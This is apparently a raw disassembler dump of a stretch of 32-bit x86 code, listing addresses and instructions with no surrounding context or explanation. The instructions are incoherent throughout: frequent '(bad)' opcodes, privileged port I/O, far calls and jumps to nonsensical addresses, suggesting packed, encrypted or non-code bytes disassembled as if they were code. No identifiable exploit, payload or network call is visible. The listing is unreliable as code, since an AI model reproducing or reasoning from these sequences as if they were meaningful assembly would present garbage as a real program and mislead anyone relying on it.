  414ab9:	icebp  
  414aba:	adc    BYTE PTR cs:[esi],dl
  414abd:	jle    0x414ad3
  414abf:	mul    DWORD PTR [edi-0x3]
  414ac2:	ret    
  414ac3:	ins    DWORD PTR es:[edi],dx
  414ac4:	adc    al,0xdd
  414ac6:	jb     0x414b17
  414ac8:	adc    eax,DWORD PTR [esi+edi*1+0x38d6ddda]
  414acf:	fs pop ebp
  414ad1:	or     al,BYTE PTR [edx-0x1a]
  414ad4:	data16 add al,0x27
  414ad7:	and    BYTE PTR [ecx],al
  414ad9:	and    ch,BYTE PTR [edi+0x4d66d9e0]
  414adf:	sub    al,0x76
  414ae1:	jp     0x414b30
  414ae3:	ins    BYTE PTR es:[edi],dx
  414ae4:	mov    ds:0x84269262,eax
  414ae9:	arpl   WORD PTR [esi-0x9],di
  414aec:	stos   DWORD PTR es:[edi],eax
  414aed:	inc    ebp
  414aee:	push   edx
  414aef:	imul   esi,DWORD PTR [ebx-0x31],0xffffffcf
  414af3:	mov    al,ds:0x572f9828
  414af9:	mov    bh,0xb4
  414afb:	loop   0x414adb
  414afd:	mov    ah,0x83
  414aff:	push   ecx
  414b00:	js     0x414b31
  414b02:	and    edi,DWORD PTR [edx+0x7608a6d5]
  414b08:	out    dx,al
  414b09:	leave  
  414b0a:	xlat   BYTE PTR ds:[ebx]
  414b0b:	jge    0x414b0b
  414b0d:	int3   
  414b0e:	fdiv   QWORD PTR [esi+0x17]
  414b11:	sbb    eax,0x531371ea
  414b16:	fcom   QWORD PTR [esi]
  414b18:	loopne 0x414ad8
  414b1a:	fdiv   DWORD PTR [esp+edx*4]
  414b1d:	je     0x414b6c
  414b1f:	xchg   BYTE PTR [ebp-0x37e670c2],dl
  414b25:	pop    es
  414b26:	iret   
  414b27:	push   ebp
  414b28:	fs push edi
  414b2a:	stos   BYTE PTR es:[edi],al
  414b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b2c:	inc    edi
  414b2d:	xchg   ebp,eax
  414b2e:	and    al,0x29
  414b30:	stos   BYTE PTR es:[edi],al
  414b31:	(bad)  
  414b32:	aad    0x9b
  414b34:	cmp    bh,BYTE PTR [ebp-0x7824209b]
  414b3a:	call   0x879e76e
  414b3f:	outs   dx,DWORD PTR ds:[esi]
  414b40:	and    DWORD PTR [ecx+0x4b3f9b16],ebp
  414b46:	ss (bad) 
  414b48:	mov    ds:0xeff2a8ac,eax
  414b4d:	jg     0x414afe
  414b4f:	arpl   WORD PTR [ebp-0x66],di
  414b52:	push   0x4
  414b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b55:	loop   0x414b13
  414b57:	sub    eax,0xb7069e4d
  414b5c:	mov    esp,DWORD PTR ds:0x822cba80
  414b62:	into   
  414b63:	jg     0x414bb2
  414b65:	jp     0x414b2b
  414b67:	cld    
  414b68:	(bad)  
  414b69:	loope  0x414b3a
  414b6b:	pop    ebx
  414b6c:	lahf   
  414b6d:	rcl    DWORD PTR [ebx],0xe3
  414b70:	adc    bl,BYTE PTR ds:0x21f6933f
  414b76:	adc    eax,0xaa3aa0c5
  414b7b:	cmc    
  414b7c:	mov    eax,0x105010a4
  414b81:	neg    ecx
  414b83:	leave  
  414b84:	xor    eax,0x366871d1
  414b89:	sti    
  414b8a:	div    DWORD PTR [edi+0x19d1fe79]
  414b90:	das    
  414b91:	(bad)  
  414b92:	imul   edx,ebx,0xffffffef
  414b95:	mov    edx,0x5eb2d718
  414b9a:	aas    
  414b9b:	or     BYTE PTR [eax-0x6],0xa7
  414b9f:	(bad)  
  414ba0:	mov    ds:0x912700f9,eax
  414ba5:	ficomp WORD PTR [eax+ecx*2-0x7a]
  414ba9:	xchg   esi,eax
  414baa:	cld    
  414bab:	das    
  414bac:	sti    
  414bad:	rol    DWORD PTR [ebx-0x2f5eec],0x46
  414bb4:	adc    cl,BYTE PTR [eax+edi*1]
  414bb7:	stc    
  414bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb9:	dec    eax
  414bba:	in     al,dx
  414bbb:	ds dec eax
  414bbd:	sbb    DWORD PTR [edx-0x6d],edx
  414bc0:	or     BYTE PTR [esi-0x781eee5],cl
  414bc6:	adc    ebp,DWORD PTR [ebp-0x21439033]
  414bcc:	xor    ebp,DWORD PTR [eax-0x63aec611]
  414bd2:	add    eax,0x3294a45a
  414bd7:	jmp    0x3e044901
  414bdc:	add    bh,BYTE PTR [edx+0x131d5200]
  414be2:	not    BYTE PTR [esi-0x5a]
  414be5:	popa   
  414be6:	mov    al,0x7f
  414be8:	mov    edi,es
  414bea:	adc    edi,eax
  414bec:	sub    eax,0x748670b
  414bf1:	push   edx
  414bf2:	or     BYTE PTR ds:0xfaec5edc,cl
  414bf8:	arpl   WORD PTR [edi],dx
  414bfa:	mov    esi,0x992d705f
  414bff:	pop    edi
  414c00:	jle    0x414bed
  414c02:	pop    ebx
  414c03:	(bad)  
  414c05:	jge    0x414c4d
  414c07:	in     eax,0x70
  414c09:	jnp    0x414bec
  414c0b:	push   esp
  414c0c:	sbb    eax,0xff21579b
  414c11:	adc    al,0xad
  414c13:	jbe    0x414bfa
  414c15:	dec    esp
  414c16:	inc    ebx
  414c17:	mov    ebp,0x441f5d54
  414c1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c1d:	(bad)  
  414c1e:	sahf   
  414c1f:	sbb    ebx,DWORD PTR [ecx+0x5a]
  414c22:	jae    0x414bbf
  414c24:	sbb    esp,esi
  414c26:	pop    ebp
  414c27:	pop    edx
  414c28:	loope  0x414c53
  414c2a:	jno    0x414c91
  414c2c:	add    al,0xac
  414c2e:	xchg   edx,eax
  414c2f:	(bad)  
  414c30:	jg     0x8134d6b4
  414c36:	jmp    0xd71d:0x9cc1bcd6
  414c3d:	(bad)  
  414c3e:	cmp    bl,dl
  414c40:	xor    bh,al
  414c42:	rcl    BYTE PTR [eax+0x5],1
  414c45:	pop    edx
  414c46:	aaa    
  414c47:	fimul  DWORD PTR [esi]
  414c49:	retf   0x3775
  414c4c:	pusha  
  414c4d:	mov    dl,0x2e
  414c4f:	aad    0x9f
  414c51:	outs   dx,DWORD PTR ds:[esi]
  414c52:	mov    ds:0xbcee9a0d,eax
  414c57:	rol    ecx,cl
  414c59:	cld    
  414c5a:	lock adc eax,0x7714b4be
  414c60:	adc    bh,al
  414c62:	(bad)  
  414c63:	add    BYTE PTR [ebx+0x37f4ef1e],dl
  414c69:	repz pop ecx
  414c6b:	call   0xfb7:0xedff0f39
  414c72:	nop
  414c73:	repnz mov ds:0x3e47ea72,al
  414c79:	addr16 std 
  414c7b:	push   0x72
  414c7d:	mov    DWORD PTR [edx],ecx
  414c7f:	adc    edi,DWORD PTR [ecx]
  414c81:	cli    
  414c82:	sub    eax,0x64a17eb8
  414c87:	jge    0x414c27
  414c89:	std    
  414c8a:	sbb    bl,bh
  414c8c:	es push ebp
  414c8e:	mov    al,ds:0xc7511b0e
  414c93:	pop    ss
  414c94:	aad    0xd5
  414c96:	out    0x84,al
  414c98:	pop    es
  414c99:	pop    esi
  414c9a:	mov    ebp,0x488e4183
  414c9f:	addr16 jae 0x414c7f
  414ca2:	cld    
  414ca3:	fidivr WORD PTR [eax-0xc]
  414ca6:	lds    esp,FWORD PTR cs:[ebp+0x7c]
  414caa:	mov    dl,0x2f
  414cac:	xchg   edx,eax
  414cad:	xor    al,cl
  414caf:	sbb    BYTE PTR [ebx],al
  414cb1:	xchg   esi,eax
  414cb2:	fistp  QWORD PTR [edx+0x0]
  414cb5:	pinsrw mm1,WORD PTR [edx-0x7ff200d4],0xa4
  414cbd:	dec    esp
  414cbe:	pop    esp
  414cbf:	push   es
  414cc0:	xchg   esi,eax
  414cc1:	mov    DWORD PTR [ebx-0x5f114165],eax
  414cc7:	std    
  414cc8:	push   cs
  414cc9:	aaa    
  414cca:	scas   al,BYTE PTR es:[edi]
  414ccb:	pop    ebp
  414ccc:	xor    DWORD PTR [ebp-0x3bc6c319],eax
  414cd2:	pop    ebp
  414cd3:	test   BYTE PTR [ecx+0x6ac7589f],cl
  414cd9:	inc    ebp
  414cda:	mov    ah,0x99
  414cdc:	mov    ds:0x58b95f35,eax
  414ce1:	mov    dh,0x20
  414ce3:	fs jbe 0x414d62
  414ce6:	lock das 
  414ce8:	push   ebx
  414ce9:	jmp    0x3fd7f02e
  414cee:	adc    al,BYTE PTR [eax+0x458d43b6]
  414cf4:	push   cs
  414cf5:	icebp  
  414cf6:	xor    eax,0x6ff5d3ca
  414cfb:	aas    
  414cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cfd:	and    esp,edi
  414cff:	push   edi
  414d00:	push   ss
  414d01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d02:	inc    eax
  414d03:	test   eax,0xd355434c
  414d08:	mov    al,ds:0x227be495
  414d0d:	ins    BYTE PTR es:[edi],dx
  414d0e:	pop    ebp
  414d0f:	lahf   
  414d10:	fisttp QWORD PTR [ebp-0x79f0a679]
  414d16:	jb     0x414d5c
  414d18:	clc    
  414d19:	dec    ecx
  414d1a:	dec    esi
  414d1b:	lds    eax,FWORD PTR [esi-0x5481e4e1]
  414d21:	addr16 jno 0x414ccc
  414d24:	pop    ss
  414d25:	pop    ss
  414d26:	loopne 0x414d71
  414d28:	cdq    
  414d29:	jg     0x414cfe
  414d2b:	popf   
  414d2c:	pop    edi
  414d2d:	mov    DWORD PTR [eax+0x15],esp
  414d30:	out    dx,eax
  414d31:	fmul   DWORD PTR [edx]
  414d33:	xchg   ebx,eax
  414d34:	pop    edx
  414d35:	addr16 pop ebp
  414d37:	adc    dh,dh
  414d39:	lahf   
  414d3a:	xchg   esi,eax
  414d3b:	cdq    
  414d3c:	mov    ebp,0xd183ab26
  414d41:	ror    DWORD PTR [eax],1
  414d43:	or     BYTE PTR [ebx],0x3e
  414d46:	mov    ecx,0x1b7be604
  414d4b:	sbb    al,0x4f
  414d4d:	cli    
  414d4e:	xchg   ebp,eax
  414d4f:	ror    DWORD PTR [edx+0x4fb03ced],1
  414d55:	mov    ch,0x4
  414d57:	dec    ecx
  414d58:	pop    edx
  414d59:	add    al,0x5d
  414d5b:	sub    ecx,eax
  414d5d:	js     0x414d11
  414d5f:	mov    bl,0x23
  414d61:	cli    
  414d62:	jno    0x414d34
  414d64:	pushf  
  414d65:	push   0x106cfb62
  414d6a:	cdq    
  414d6b:	sbb    DWORD PTR [eax-0x10],ebx
  414d6e:	adc    BYTE PTR [ebp+eax*1+0x27],0x6e
  414d73:	imul   edx,DWORD PTR ds:0x82f9d9de,0x1feca7ce
  414d7d:	xor    DWORD PTR [edx],ebp
  414d7f:	lahf   
  414d80:	(bad)  
  414d81:	sub    bl,bl
  414d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d84:	test   BYTE PTR [ebp+edi*1+0x17],bl
  414d88:	lock (bad) 
  414d8a:	cli    
  414d8b:	fwait
  414d8c:	vmwrite eax,DWORD PTR [edx-0x47]
  414d90:	fisub  DWORD PTR [esi+0x21bacf59]
  414d96:	or     al,0xee
  414d98:	out    dx,eax
  414d99:	in     eax,0x1d
  414d9b:	jecxz  0x414da8
  414d9d:	hlt    
  414d9e:	popa   
  414d9f:	mov    dh,0xec
  414da1:	(bad)  
  414da2:	nop
  414da3:	mov    ecx,edi
  414da5:	push   ebp
  414da6:	repnz adc eax,0x79c13cba
  414dac:	sub    al,0x8d
  414dae:	in     al,0xb7
  414db0:	sub    BYTE PTR [ebx+0x3b7517af],0x56
  414db7:	iret   
  414db8:	das    
  414db9:	lods   al,BYTE PTR ds:[esi]
  414dba:	push   ebp
  414dbb:	lock push 0xd9c78c4f
  414dc1:	test   al,0xee
  414dc3:	ds and al,0x8d
  414dc6:	or     BYTE PTR [eax-0x380c44a6],0x58
  414dcd:	mov    ah,0x4d
  414dcf:	fldenv [ecx-0x15]
  414dd2:	bsf    ecx,DWORD PTR [edx]
  414dd5:	arpl   WORD PTR [eax+0x3c],sp
  414dd8:	push   eax
  414dd9:	sub    eax,0xcd370fab
  414dde:	shl    DWORD PTR [ebx],0x6
  414de1:	push   eax
  414de2:	(bad)  
  414de3:	iret   
  414de4:	mov    ch,0xe0
  414de6:	push   edx
  414de7:	dec    eax
  414de8:	fbld   TBYTE PTR [ecx]
  414dea:	in     al,0xa
  414dec:	jno    0x414dd9
  414dee:	and    BYTE PTR [esi+0x70810b2f],dh
  414df4:	mov    dl,0xa6
  414df6:	pusha  
  414df7:	or     eax,0x957c4bf6
  414dfc:	xor    al,0xae
  414dfe:	jno    0x414e16
  414e00:	mov    al,0x0
  414e02:	jb     0x414e29
  414e04:	pop    ebp
  414e05:	test   al,0x19
  414e07:	jle    0x414dae
  414e09:	mov    esp,0xa5c4590f
  414e0e:	loop   0x414da1
  414e10:	jo     0x414e4b
  414e12:	addr16 jb 0x414e20
  414e15:	repz push esp
  414e17:	dec    esi
  414e18:	leave  
  414e19:	mov    bl,0xfd
  414e1b:	mov    eax,0x9ffab47d
  414e20:	shl    BYTE PTR ds:0x79fd2336,1
  414e26:	sbb    esi,eax
  414e28:	and    BYTE PTR [esi],bl
  414e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e2b:	in     al,0xa6
  414e2d:	adc    al,0x22
  414e2f:	xor    al,BYTE PTR [esi-0x5aad0987]
  414e35:	sbb    eax,0x6f6ff703
  414e3a:	pop    ds
  414e3b:	out    0x47,eax
  414e3d:	(bad)  
  414e3e:	xor    eax,0x4157e894
  414e43:	mov    cl,0x8d
  414e45:	sub    dh,al
  414e47:	fild   WORD PTR [esi-0x3f]
  414e4a:	mov    BYTE PTR [eax],ah
  414e4c:	push   eax
  414e4d:	fwait
  414e4e:	dec    edi
  414e4f:	jo     0x414ed0
  414e51:	lods   eax,DWORD PTR ds:[esi]
  414e52:	adc    DWORD PTR [esi],esi
  414e54:	and    eax,0x68b25769
  414e59:	xchg   ebp,eax
  414e5a:	(bad)  
  414e5c:	jmp    FWORD PTR [esi]
  414e5e:	(bad)  
  414e5f:	jns    0x414e8f
  414e61:	sbb    BYTE PTR [edx-0x1d079cd6],al
  414e67:	jns    0x414ed7
  414e69:	xor    eax,0xd74ef7c3
  414e6e:	mov    ds:0x8c0207b5,al
  414e73:	or     ah,BYTE PTR [esi]
  414e75:	pushw  0xffac
  414e78:	int3   
  414e79:	leave  
  414e7a:	cld    
  414e7b:	or     al,0xaf
  414e7d:	into   
  414e7e:	mul    al
  414e80:	jg     0x414eb4
  414e82:	mov    ds:0xfa2e5c0f,eax
  414e87:	loop   0x414e81
  414e89:	loopne 0x414ef0
  414e8b:	ds pop esp
  414e8d:	mov    bh,0x3a
  414e8f:	cdq    
  414e90:	mov    eax,0x2aef5799
  414e95:	push   cs
  414e96:	sub    BYTE PTR [ebx-0x7ebd0c65],al
  414e9c:	cmp    ch,BYTE PTR [esi+esi*4-0x56c7f853]
  414ea3:	sbb    ah,BYTE PTR [edx-0xe291f8b]
  414ea9:	and    al,0x28
  414eab:	into   
  414eac:	ret    
  414ead:	fwait
  414eae:	xchg   esi,eax
  414eaf:	(bad)  
  414eb0:	mov    bh,0xa0
  414eb2:	push   ecx
  414eb3:	ror    BYTE PTR ds:0xa24311ff,1
  414eb9:	add    DWORD PTR [ebx-0x3beedd66],ecx
  414ebf:	ins    DWORD PTR es:[edi],dx
  414ec0:	cwde   
  414ec1:	cmp    al,0xff
  414ec3:	out    dx,eax
  414ec4:	and    edx,DWORD PTR [eax-0x2]
  414ec7:	mov    esi,0xc0f95ea4
  414ecc:	sbb    ch,bh
  414ece:	mov    ds:0x6d303372,al
  414ed3:	in     eax,dx
  414ed4:	push   ebp
  414ed5:	jae    0x414e68
  414ed7:	pop    eax
  414ed8:	fmul   DWORD PTR [ebx]
  414eda:	add    DWORD PTR [eax-0x13],edx
  414edd:	mov    al,0x1e
  414edf:	sub    bh,cl
  414ee1:	adc    bh,ah
  414ee3:	sahf   
  414ee4:	mov    ds:0xe18f8459,al
  414ee9:	out    dx,eax
  414eea:	push   ds
  414eeb:	test   BYTE PTR [ebp+0x9f6f3f5],bh
  414ef1:	pusha  
  414ef2:	xor    bh,BYTE PTR [ebx]
  414ef4:	sbb    eax,0x6bec29c2
  414ef9:	sar    DWORD PTR [edi],cl
  414efb:	les    eax,FWORD PTR [eax]
  414efd:	mov    dl,0xdc
  414eff:	lods   al,BYTE PTR ds:[esi]
  414f00:	dec    ebx
  414f01:	jo     0x414ed2
  414f03:	add    al,0xa
  414f05:	imul   ecx,DWORD PTR [eax],0x8fcabd9
  414f0b:	sti    
  414f0c:	pop    ecx
  414f0d:	xor    edx,DWORD PTR [esp+esi*2+0x6f3847d]
  414f14:	rcpps  xmm3,XMMWORD PTR [esi-0x28044e96]
  414f1b:	dec    ebp
  414f1c:	mov    ah,0x3e
  414f1e:	adc    DWORD PTR [edx],0xffffffde
  414f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f22:	cmp    DWORD PTR [eax-0x21434f3c],edx
  414f28:	pusha  
  414f29:	loopne 0x414f45
  414f2b:	add    edx,DWORD PTR [ecx-0x3271cc63]
  414f31:	dec    edx
  414f32:	sub    esp,DWORD PTR [eax-0x4b]
  414f35:	push   ebp
  414f36:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  414f38:	mov    DWORD PTR [ebp+0x44],esp
  414f3b:	push   0x3337634e
  414f40:	add    DWORD PTR [ecx-0x27],esi
  414f43:	mov    esp,0x1bc5ae51
  414f48:	mov    ss,WORD PTR [ebp+0x7a]
  414f4b:	mov    ebx,0x3b6839b4
  414f50:	mov    edx,0x5234b4d1
  414f55:	sbb    ch,BYTE PTR [edx+0x33]
  414f58:	inc    edi
  414f59:	lea    esi,[edi+ecx*8-0x33f01b71]
  414f60:	cwde   
  414f61:	es jl  0x414f20
  414f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f65:	jge    0x414efd
  414f67:	rol    ecx,cl
  414f69:	int3   
  414f6a:	out    0xe0,eax
  414f6c:	jl     0x414f66
  414f6e:	mov    eax,ds:0xf61e3b24
  414f73:	out    dx,eax
  414f74:	mov    ch,0x48
  414f76:	loopne 0x414f69
  414f78:	sahf   
  414f79:	call   0xf1e3:0x17f0090b
  414f80:	(bad)  
  414f81:	xchg   ebx,eax
  414f82:	rcl    DWORD PTR ds:0x6251e8c7,0xf2
  414f89:	ss enter 0x82cf,0x7a
  414f8e:	mov    ah,0x2
  414f90:	sbb    DWORD PTR [edx-0x1ee17a41],ecx
  414f96:	jg     0x414f59
  414f98:	mul    edx
  414f9a:	cmp    ch,BYTE PTR [esi-0x63]
  414f9d:	add    eax,0x66f9874e
  414fa2:	dec    esi
  414fa3:	(bad)  
  414fa4:	xchg   edi,eax
  414fa5:	and    DWORD PTR [edi-0x4b],eax
  414fa8:	sti    
  414fa9:	mov    eax,fs:0x850a9ba6
  414faf:	imul   ebp
  414fb1:	cmp    al,0x3
  414fb3:	jo     0x414f76
  414fb5:	sub    al,0x41
  414fb7:	(bad)  
  414fb9:	mov    edi,0xf05498dd
  414fbe:	aad    0x33
  414fc0:	jne    0x414ff1
  414fc2:	adc    BYTE PTR [esi-0x33],al
  414fc5:	mov    eax,ds:0xecc8dd18
  414fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fcb:	jns    0x414f83
  414fcd:	cmp    eax,esp
  414fcf:	mov    ah,0x9b
  414fd1:	jnp    0x415000
  414fd3:	std    
  414fd4:	inc    ebx
  414fd5:	ss pop esi
  414fd7:	test   BYTE PTR [eax-0xd460f7b],dl
  414fdd:	add    eax,0xfe525263
  414fe2:	mov    dl,0xc2
  414fe4:	push   edi
  414fe5:	add    eax,DWORD PTR [edx]
  414fe7:	mov    ds:0xc822c603,eax
  414fec:	enter  0xe7e,0xb1
  414ff0:	cmp    eax,DWORD PTR fs:[eax-0x4]
  414ff4:	pop    esp
  414ff5:	mov    cs,WORD PTR [edi+0x18]
  414ff8:	mov    edx,DWORD PTR [esi]
  414ffa:	pop    edi
  414ffb:	push   ebx
  414ffc:	in     eax,dx
  414ffd:	jnp    0x415016
  414fff:	inc    ebx
  415000:	cmp    al,0x34
  415002:	sahf   
  415003:	add    eax,0x458b526d
  415008:	xchg   ebp,eax
  415009:	fs jbe 0x41500b
  41500c:	aad    0x60
  41500e:	sar    DWORD PTR [edx+0x4f945b6],0x8d
  415015:	es jmp 0x414ff8
  415018:	and    al,0xc5
  41501a:	idiv   edi
  41501c:	pop    es
  41501d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41501e:	pop    esi
  41501f:	fs into 
  415021:	iret   
  415022:	add    BYTE PTR ds:[edi],0xdd
  415026:	retf   0x1bee
  415029:	ins    DWORD PTR es:[edi],dx
  41502a:	or     al,0x96
  41502c:	cmp    al,0xe0
  41502e:	das    
  41502f:	or     DWORD PTR [edi+0x77],edx
  415032:	xor    BYTE PTR [ecx+esi*4],0xfa
  415036:	sub    eax,0xfcc533f5
  41503b:	cld    
  41503c:	fld    TBYTE PTR [eax+0x16]
  41503f:	call   0x30e8:0x32f3a15a
  415046:	sub    DWORD PTR [ecx-0x6b],edi
  415049:	mov    ch,BYTE PTR [ebp+0x277070ef]
  41504f:	call   0x83e:0x198829af
  415056:	cdq    
  415057:	repz cmp al,0x85
  41505a:	jp     0x415046
  41505c:	mov    bh,0xdc
  41505e:	mov    al,ds:0x64069fe9
  415063:	mov    al,ds:0xf10945cf
  415068:	or     edi,DWORD PTR ds:0x68d94de6
  41506e:	clc    
  41506f:	ins    BYTE PTR es:[edi],dx
  415070:	pushf  
  415071:	test   eax,0x70f97d1c
  415076:	jecxz  0x4150b0
  415078:	ss call 0x9e716c56
  41507e:	test   bl,bl
  415080:	mov    ebx,0xe366ecb0
  415085:	(bad)  
  415086:	sub    DWORD PTR [esi],edi
  415088:	mov    eax,ds:0x91a57802
  41508d:	dec    eax
  41508e:	xor    DWORD PTR [edx+0x73],0x40669ef1
  415095:	xlat   BYTE PTR ds:[ebx]
  415096:	ret    
  415097:	jle    0x4150a4
  415099:	push   0x54
  41509b:	mov    eax,0xaf9e96ff
  4150a0:	dec    esi
  4150a1:	div    edi
  4150a3:	adc    eax,0xc140ba9b
  4150a8:	lahf   
  4150a9:	adc    al,0xe1
  4150ab:	shl    ecx,0xd6
  4150ae:	pop    esp
  4150af:	cmp    DWORD PTR [edi+0x6092cb52],ebx
  4150b5:	test   al,0x3e
  4150b7:	ds pushf 
  4150b9:	push   es
  4150ba:	mov    esi,0x33da2661
  4150bf:	add    eax,0xc15d78dc
  4150c4:	pusha  
  4150c5:	xor    esp,DWORD PTR [edi-0x2033f768]
  4150cb:	ss push ecx
  4150cd:	mov    cl,0xa4
  4150cf:	pop    ecx
  4150d0:	pop    es
  4150d1:	push   ss
  4150d2:	cwde   
  4150d3:	mov    edi,es
  4150d5:	scas   al,BYTE PTR es:[edi]
  4150d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150d7:	pop    esp
  4150d8:	dec    esi
  4150d9:	ja     0x415088
  4150db:	mov    gs,WORD PTR [edx-0x5a]
  4150de:	and    dh,bh
  4150e0:	push   esi
  4150e1:	je     0x415118
  4150e3:	fwait
  4150e4:	jge    0x41511f
  4150e6:	and    DWORD PTR [ecx],0xffffff88
  4150e9:	lea    ebx,[edi-0x40]
  4150ec:	pop    ebp
  4150ed:	iret   
  4150ee:	fadd   st(7),st
  4150f0:	mov    ah,0x35
  4150f2:	mov    eax,ds:0x2c42cd41
  4150f7:	jnp    0x41514f
  4150f9:	out    dx,al
  4150fa:	in     al,0x8b
  4150fc:	cmp    eax,0x92ff5418
  415101:	mov    bh,0xb7
  415103:	dec    edx
  415104:	test   eax,0x141195c5
  415109:	jle    0x4150a3
  41510b:	jg     0x4150b2
  41510d:	pop    ebx
  41510e:	stc    
  41510f:	adc    eax,0xb5c0de69
  415114:	out    0x3,al
  415116:	pop    esi
  415117:	fst    QWORD PTR [edx+0x3d]
  41511a:	push   ebx
  41511b:	js     0x4150e6
  41511d:	pop    edi
  41511e:	sub    DWORD PTR [ebp+esi*1+0x14],edx
  415122:	arpl   WORD PTR [edx-0x46cdedf1],ax
  415128:	push   0x9c7d2864
  41512d:	das    
  41512e:	push   es
  41512f:	mov    ds:0x82894b0c,eax
  415134:	lock adc esp,DWORD PTR es:[ecx]
  415138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415139:	call   0x6dce:0x277fb841
  415140:	mov    ds:0x535fa91f,al
  415145:	daa    
  415146:	mov    cl,0x18
  415148:	sub    DWORD PTR [edx],eax
  41514a:	inc    esi
  41514b:	mov    eax,ds:0xcf712a23
  415150:	mov    al,ds:0x4adc64d8
  415155:	inc    esi
  415156:	jno    0x4151c8
  415158:	mov    dh,0x8c
  41515a:	pop    esi
  41515b:	or     eax,0x4fffb03e
  415160:	xor    DWORD PTR [edi+0x2e],edi
  415163:	fidivr DWORD PTR [esp]
  415166:	arpl   WORD PTR [ecx+0x1565c675],si
  41516c:	sbb    eax,0x8df01ab3
  415171:	push   es
  415172:	dec    edx
  415173:	xlat   BYTE PTR ds:[ebx]
  415174:	mov    ebp,0x8be0429c
  415179:	fucomip st,st(4)
  41517b:	imul   ecx,DWORD PTR [edi-0x36],0xffffff9b
  41517f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415180:	dec    edi
  415181:	loopne 0x415195
  415183:	mov    al,ds:0x88c90c8b
  415188:	pop    es
  415189:	xor    DWORD PTR [eax+0x450d6b51],edi
  41518f:	mov    al,0x14
  415191:	sbb    esp,ebp
  415193:	out    0xde,eax
  415195:	lahf   
  415196:	aaa    
  415197:	test   eax,0x112c5b7b
  41519c:	in     eax,0x3f
  41519e:	jmp    0x11d0592
  4151a3:	xor    eax,0x14968ff9
  4151a8:	ja     0x415165
  4151aa:	dec    esp
  4151ab:	ins    DWORD PTR es:[edi],dx
  4151ac:	repnz out 0xc9,eax
  4151af:	jno    0x415154
  4151b1:	out    dx,al
  4151b2:	ss inc ebp
  4151b4:	push   edx
  4151b5:	pop    ecx
  4151b6:	cwde   
  4151b7:	adc    eax,0xb0922c74
  4151bc:	mov    ecx,0x888ebdb5
  4151c1:	sbb    esi,DWORD PTR [edx]
  4151c3:	and    eax,0xdc6f87a9
  4151c8:	(bad)  
  4151c9:	fidiv  WORD PTR [edi-0x3397a218]
  4151cf:	xlat   BYTE PTR ds:[ebx]
  4151d0:	sahf   
  4151d1:	jle    0x415168
  4151d3:	scas   al,BYTE PTR es:[edi]
  4151d4:	aam    0x85
  4151d6:	push   ss
  4151d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151d8:	dec    ecx
  4151d9:	fsubr  st(1),st
  4151db:	push   ebp
  4151dc:	adc    eax,0xd3ee41da
  4151e1:	(bad)  
  4151e2:	xor    al,0xfe
  4151e4:	retf   
  4151e5:	lock push ebx
  4151e7:	ins    DWORD PTR es:[edi],dx
  4151e8:	xor    al,0xf3
  4151ea:	mov    cl,0x9c
  4151ec:	add    eax,DWORD PTR [ebx+0x13a2928d]
  4151f2:	jbe    0x41518e
  4151f4:	sti    
  4151f5:	aas    
  4151f6:	cmc    
  4151f7:	stos   BYTE PTR es:[edi],al
  4151f8:	sub    esi,DWORD PTR [edi]
  4151fa:	ror    BYTE PTR [ecx+0x3f19180e],1
  415200:	xor    eax,0x642f52d5
  415205:	mov    al,0x4e
  415207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415208:	adc    edx,DWORD PTR [esi-0x6a39ad40]
  41520e:	scas   al,BYTE PTR es:[edi]
  41520f:	int    0x7d
  415211:	push   ss
  415212:	in     eax,0xf0
  415214:	cli    
  415215:	out    dx,eax
  415216:	jnp    0x4151c5
  415218:	push   cs
  415219:	inc    ecx
  41521a:	sbb    eax,0x41edc8ac
  41521f:	mov    ebp,DWORD PTR [edi-0x58]
  415222:	popf   
  415223:	mov    edi,edi
  415225:	mov    cl,dh
  415227:	add    DWORD PTR [edx],0x61
  41522a:	mov    ebx,0xf9d984de
  41522f:	or     BYTE PTR [ecx+eiz*2+0x1e],0x6e
  415234:	inc    ebp
  415235:	sub    BYTE PTR [esp+edi*1+0x12],bl
  415239:	push   0xffffffbf
  41523b:	push   ss
  41523c:	inc    edi
  41523d:	stc    
  41523e:	push   esi
  41523f:	ret    
  415240:	clc    
  415241:	pop    eax
  415242:	(bad)  
  415243:	neg    ecx
  415245:	mov    eax,esp
  415247:	clc    
  415248:	pop    ebx
  415249:	aaa    
  41524a:	cs scas eax,DWORD PTR es:[edi]
  41524c:	mov    ds:0x8a582654,eax
  415251:	dec    eax
  415252:	and    ch,dl
  415254:	shr    DWORD PTR [esi+esi*8],cl
  415257:	inc    esp
  415258:	shl    BYTE PTR [ecx],0x2f
  41525b:	js     0x415250
  41525d:	add    al,0x9c
  41525f:	inc    ebx
  415260:	add    dl,BYTE PTR [eax+0xb5c4a3e]
  415266:	mov    esi,0x72927d82
  41526b:	jmp    0x1f9b2b3b
  415270:	xlat   BYTE PTR ds:[ebx]
  415271:	daa    
  415272:	into   
  415273:	inc    edx
  415274:	lods   eax,DWORD PTR ds:[esi]
  415275:	push   esi
  415276:	mov    BYTE PTR [esi-0x6072923c],bl
  41527c:	ret    
  41527d:	das    
  41527e:	mov    DWORD PTR [ecx],ecx
  415280:	jecxz  0x41526f
  415282:	push   ebx
  415283:	scas   eax,DWORD PTR es:[edi]
  415284:	data16 cld 
  415286:	cmp    esp,ebx
  415288:	out    dx,al
  415289:	sbb    DWORD PTR [eax],esp
  41528b:	in     al,dx
  41528c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
